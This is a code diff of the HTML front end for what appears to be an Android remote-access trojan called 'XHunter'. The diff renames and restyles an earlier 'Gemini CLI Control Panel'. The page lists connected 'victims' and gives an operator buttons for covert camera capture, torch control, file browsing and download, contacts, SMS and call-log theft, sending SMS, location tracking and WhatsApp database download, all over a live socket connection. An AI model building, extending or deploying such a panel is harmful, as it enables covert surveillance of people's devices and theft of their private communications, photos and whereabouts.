@@ -3,113 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gemini CLI Control Panel</title>
+    <title>XHunter Control Panel</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
-        <h1>Gemini CLI Control Panel</h1>
+        <h1>🔥 XHunter Control Panel</h1>
+        
+        <!-- Connected Devices Section -->
         <div id="device-list">
-            <h2>Connected Devices</h2>
+            <h2>📱 Connected Devices</h2>
             <ul id="victims"></ul>
         </div>
-                    <div id="controls">
-                        <h2>Controls</h2>
-                        <div class="control-buttons">
-                            <button id="torch-control-btn">Torch Control</button>
-                            <button id="camera-capture-btn">Camera Capture</button>
-                                        </div>
-                                    </div>
-                        
-                                    <div id="file-management-controls">
-                                        <h2>File Management</h2>
-                                        <div class="control-buttons">
-                                            <button id="get-dir-btn">Get Directory Listing</button>
-                                            <input type="text" id="dir-path-input" placeholder="Enter path (e.g., /Download)">
-                                            <button id="download-file-btn">Download File</button>
-                                            <input type="text" id="file-path-input" placeholder="Enter file path to download">
-                                            <button id="preview-image-btn">Preview Image</button>
-                                            <input type="text" id="image-path-input" placeholder="Enter image path to preview">
-                                        </div>
-                                        <div id="dir-listing-output" class="output-area"></div>
-                                    </div>
-                        
-                                    <div id="app-info-controls">
-                                        <h2>App Information</h2>
-                                        <div class="control-buttons">
-                                            <button id="get-installed-apps-btn">Get Installed Apps</button>
-                                        </div>
-                                        <div id="installed-apps-output" class="output-area"></div>
-                                    </div>
-                        
-                                    <div id="contact-sms-call-controls">
-                                        <h2>Contacts, SMS & Calls</h2>
-                                        <div class="control-buttons">
-                                            <button id="get-contacts-btn">Get Contacts</button>
-                                            <button id="get-sms-btn">Get SMS</button>
-                                            <button id="get-call-log-btn">Get Call Log</button>
-                                            <button id="send-sms-btn">Send SMS</button>
-                                            <input type="text" id="sms-number-input" placeholder="Number">
-                                            <input type="text" id="sms-message-input" placeholder="Message">
-                                        </div>
-                                        <div id="contacts-output" class="output-area"></div>
-                                        <div id="sms-output" class="output-area"></div>
-                                        <div id="call-log-output" class="output-area"></div>
-                                    </div>
-                        
-                                    <div id="location-controls">
-                                        <h2>Location</h2>
-                                        <div class="control-buttons">
-                                            <button id="get-location-btn">Get Location</button>
-                                        </div>
-                                        <div id="location-output" class="output-area"></div>
-                                    </div>
-                        
-                                    <div id="whatsapp-controls">
-                                        <h2>WhatsApp Database</h2>
-                                        <div class="control-buttons">
-                                            <button id="download-whatsapp-db-btn">Download WhatsApp DB</button>
-                                        </div>
-                                    </div>
-                                
-                    <!-- Torch Control Dialog -->
-                    <div id="torchControlDialog" class="dialog">
-                        <div class="dialog-content">
-                            <span class="close-button">&times;</span>
-                            <h3>Torch Control for <span id="torch-victim-name"></span></h3>
-                            <div class="dialog-buttons">
-                                <button id="torch-on-btn" class="on">ON</button>
-                                <button id="torch-off-btn" class="off">OFF</button>
-                            </div>
-                        </div>
-                    </div>
 
-                    <!-- Camera Capture Dialog -->
-                    <div id="cameraCaptureDialog" class="dialog">
-                        <div class="dialog-content">
-                            <span class="close-button">&times;</span>
-                            <h3>Capture Image for <span id="camera-victim-name"></span></h3>
-                            <div class="dialog-buttons">
-                                <button id="front-camera-btn" class="front">Front Camera</button>
-                                <button id="back-camera-btn" class="back">Back Camera</button>
-                            </div>
-                        </div>
-                    </div>
+        <!-- Controls Section -->
+        <div id="controls">
+            <h2>🎮 Controls</h2>
+            <div class="control-buttons">
+                <button id="torch-control-btn" class="control-btn">🔦 Torch Control</button>
+                <button id="camera-capture-btn" class="control-btn">📷 Camera Capture</button>
+            </div>
+        </div>
 
-                    <!-- Image Preview Dialog -->
-                    <div id="imagePreviewDialog" class="dialog">
-                        <div class="dialog-content">
-                            <span class="close-button">&times;</span>
-                            <h3>Captured Image from <span id="preview-victim-name"></span></h3>
-                            <div id="camera-preview">
-                                <img id="captured-image" src="" alt="Captured Image">
-                            </div>
-                        </div>
-                    </div>
+        <!-- File Management Section -->
+        <div id="file-management-controls" class="control-section">
+            <h2>📁 File Management</h2>
+            <div class="control-buttons">
+                <button id="get-dir-btn" class="control-btn">📂 Get Directory</button>
+                <input type="text" id="dir-path-input" placeholder="Enter path (e.g., /Download)">
+                
+                <button id="download-file-btn" class="control-btn">⬇️ Download File</button>
+                <input type="text" id="file-path-input" placeholder="Enter file path">
+                
+                <button id="preview-image-btn" class="control-btn">🖼️ Preview Image</button>
+                <input type="text" id="image-path-input" placeholder="Enter image path">
+            </div>
+            <div id="dir-listing-output" class="output-area"></div>
+        </div>
+
+        <!-- App Information Section -->
+        <div id="app-info-controls" class="control-section">
+            <h2>📱 App Information</h2>
+            <div class="control-buttons">
+                <button id="get-installed-apps-btn" class="control-btn">📊 Get Installed Apps</button>
+            </div>
+            <div id="installed-apps-output" class="output-area"></div>
+        </div>
+
+        <!-- Contacts, SMS & Calls Section -->
+        <div id="contact-sms-call-controls" class="control-section">
+            <h2>📞 Contacts, SMS & Calls</h2>
+            <div class="control-buttons">
+                <button id="get-contacts-btn" class="control-btn">👥 Get Contacts</button>
+                <button id="get-sms-btn" class="control-btn">💬 Get SMS</button>
+                <button id="get-call-log-btn" class="control-btn">📞 Get Call Log</button>
+                
+                <div class="sms-send">
+                    <input type="text" id="sms-number-input" placeholder="Phone Number">
+                    <input type="text" id="sms-message-input" placeholder="Message">
+                    <button id="send-sms-btn" class="control-btn">📤 Send SMS</button>
                 </div>
+            </div>
+            <div id="contacts-output" class="output-area"></div>
+            <div id="sms-output" class="output-area"></div>
+            <div id="call-log-output" class="output-area"></div>
+        </div>
 
+        <!-- Location Section -->
+        <div id="location-controls" class="control-section">
+            <h2>📍 Location</h2>
+            <div class="control-buttons">
+                <button id="get-location-btn" class="control-btn">🌍 Get Location</button>
+            </div>
+            <div id="location-output" class="output-area"></div>
+        </div>
+
+        <!-- WhatsApp Database Section -->
+        <div id="whatsapp-controls" class="control-section">
+            <h2>💬 WhatsApp Database</h2>
+            <div class="control-buttons">
+                <button id="download-whatsapp-db-btn" class="control-btn">📦 Download WhatsApp DB</button>
+            </div>
+        </div>
+
+        <!-- Torch Control Dialog -->
+        <div id="torchControlDialog" class="dialog">
+            <div class="dialog-content">
+                <span class="close-button">&times;</span>
+                <h3>🔦 Torch Control</h3>
+                <p>Device: <span id="torch-victim-name" class="device-name"></span></p>
+                <div class="dialog-buttons">
+                    <button id="torch-on-btn" class="dialog-btn on">💡 TURN ON</button>
+                    <button id="torch-off-btn" class="dialog-btn off">🔌 TURN OFF</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Camera Capture Dialog -->
+        <div id="cameraCaptureDialog" class="dialog">
+            <div class="dialog-content">
+                <span class="close-button">&times;</span>
+                <h3>📷 Camera Capture</h3>
+                <p>Device: <span id="camera-victim-name" class="device-name"></span></p>
+                <div class="dialog-buttons">
+                    <button id="front-camera-btn" class="dialog-btn front">👤 Front Camera</button>
+                    <button id="back-camera-btn" class="dialog-btn back">📷 Back Camera</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Image Preview Dialog -->
+        <div id="imagePreviewDialog" class="dialog">
+            <div class="dialog-content">
+                <span class="close-button">&times;</span>
+                <h3>🖼️ Captured Image</h3>
+                <p>Device: <span id="preview-victim-name" class="device-name"></span></p>
+                <div id="camera-preview">
+                    <img id="captured-image" src="" alt="Captured Image">
+                </div>
+                <div class="preview-buttons">
+                    <button id="download-image-btn" class="dialog-btn download">⬇️ Download Image</button>
+                    <button id="close-preview-btn" class="dialog-btn close">✖️ Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast Message -->
     <div id="toast-message"></div>
 
+    <!-- Scripts -->
     <script src="/socket.io/socket.io.js"></script>
     <script src="script.js"></script>
 </body>
